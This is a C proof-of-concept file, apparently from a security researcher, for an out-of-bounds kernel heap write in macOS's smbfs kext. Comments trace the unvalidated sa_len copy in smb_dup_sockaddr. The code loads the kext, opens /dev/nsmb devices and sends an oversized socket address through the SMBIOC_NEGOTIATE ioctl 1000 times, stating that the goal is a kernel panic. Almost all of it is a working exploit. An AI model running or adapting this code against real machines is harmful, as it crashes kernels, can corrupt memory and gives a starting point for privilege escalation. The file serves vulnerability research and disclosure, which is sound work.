//
//  main.c
//  poc_oob_write
//
//  Created by sreejith on 3/15/22.
//

#include <limits.h>
#include <sys/fcntl.h>
#include <sys/types.h>
#include <IOKit/kext/KextManager.h>

#include <smbfs/netbios.h>
#include <smbfs/smb_dev.h>


///
/// The method `smb_dup_sockaddr` is used in `smbfs.kext` to duplicate a socket address. This
/// method allocates a memory of size `sizeof(struct sockaddr_nb)` and type `M_SONAME` and
/// copies `sa_len` bytes from socket address to allocated memory as shown below:
///
/// struct sockaddr *
/// smb_dup_sockaddr(struct sockaddr *sa, int canwait)
/// {
///    struct sockaddr *sa2;
///
///    // ***NOTE***: The size of allocated memory is 56 bytes (sizeof(struct sockaddr_nb))
///    //                     This memory is allocated on default.64 zone
///    SMB_MALLOC(sa2, struct sockaddr *, sizeof(struct sockaddr_nb), M_SONAME,
///           canwait ? M_WAITOK : M_NOWAIT);
///
///    // ***NOTE***: The amount of bytes copied to allocated buffer is the length of
///    //                     input socket address (`sa->sa_len`). The `sa_len` field is of type
///    //                     uint8_t and its value can be upto 255 (NO validation is done by
///    //                     callers of this method to make sure that the size of input socket
///    //                     address is less than or equal to 52 bytes)
///    if (sa2)
///        bcopy(sa, sa2, sa->sa_len);
///    return (sa2);
/// }
///
/// As noted above in the code snippet, an OOB write in default.64 zone occurs when the length
/// of input socket address (`sa_len`) is greater than 64.
///
///


int smb_client_open_dev(void) {
    char path[PATH_MAX];
    for (int i=0; i<1024; i++) {
        snprintf(path, sizeof(path), "/dev/nsmb%d", i);
        int fd = open(path, O_RDONLY);
        if (fd >= 0) {
            return fd;
        }
    }
    return -1;
}

void smb_client_load_kext(void) {
    int result = KextManagerLoadKextWithIdentifier(CFSTR("com.apple.filesystems.smbfs"), NULL);
    assert(result == KERN_SUCCESS);
}


int overflow_zone_kext_kalloc_64(char* overflow_data, uint overflow_size) {
    /// The size of allocated memory for duplicated sockaddr in `smb_dup_sockaddr` method
    const int allocated_memory_size = 64;
    const int max_sockaddr_length = UINT8_MAX;
    
    assert(overflow_size <= max_sockaddr_length - allocated_memory_size);

    int fd_dev = smb_client_open_dev();
    if (fd_dev < 0) {
        return errno;
    }
    
    int input_sockaddr_length = allocated_memory_size + overflow_size;
    struct sockaddr* input_sockaddr = alloca(input_sockaddr_length);
    input_sockaddr->sa_len = input_sockaddr_length;
    memcpy((char*)input_sockaddr + allocated_memory_size, overflow_data, overflow_size);

    /// The ioctl requests for smb device is handled by `nsmb_dev_ioctl` method defined in
    /// `smb_dev.c`. This method will pass the `SMBIOC_NEGOTIATE` ioctl commands down
    /// to `smb_usr_negotiate` method defined in `smb_usr.c` which will inturn pass it down to
    /// `smb_sm_negotiate` defined in `smb_conn.c`
    ///
    /// The `smb_sm_negotiate` method will copy the input socket address from user memory
    /// to kernel memory and without any validation pass the copied in socket address down to
    /// `smb_session_create` method defined in `smb_conn.c`
    ///
    /// The `smb_session_create` also does not perform any validation of input socket address
    /// and it will call `smb_dup_sockaddr` to duplicate the input socket address, triggering the
    /// OOB write vulnerability
    struct smbioc_negotiate req;
    bzero(&req, sizeof(req));
    req.ioc_version = SMB_IOC_STRUCT_VERSION;
    req.ioc_saddr = input_sockaddr;
    req.ioc_saddr_len = input_sockaddr_length;
    req.ioc_extra_flags |= SMB_FORCE_NEW_SESSION;

    ioctl(fd_dev, SMBIOC_NEGOTIATE, &req);

    close(fd_dev);
    return 0;
}

int main(int argc, const char * argv[]) {
    smb_client_load_kext();

    /// Maximum length overflow to trigger kernel panic as soon as possible
    uint overflow_size = UINT8_MAX - 64;
    char overflow_data[overflow_size];
    
    /// Will help in triggering zone element modifier after free panic
    memset(overflow_data, 0xff, sizeof(overflow_data));

    for (int i=0; i<1000; i++) {
        printf("[INFO] executing overflow %d/%d\n", i, 1000);
        int error = overflow_zone_kext_kalloc_64(overflow_data, overflow_size);
        if (error) {
            printf("[ERROR] overflow failed, err: %s\n", strerror(error));
            exit(1);
        }
    }

    printf("[INFO] overflow complete\n");

    return 0;
}
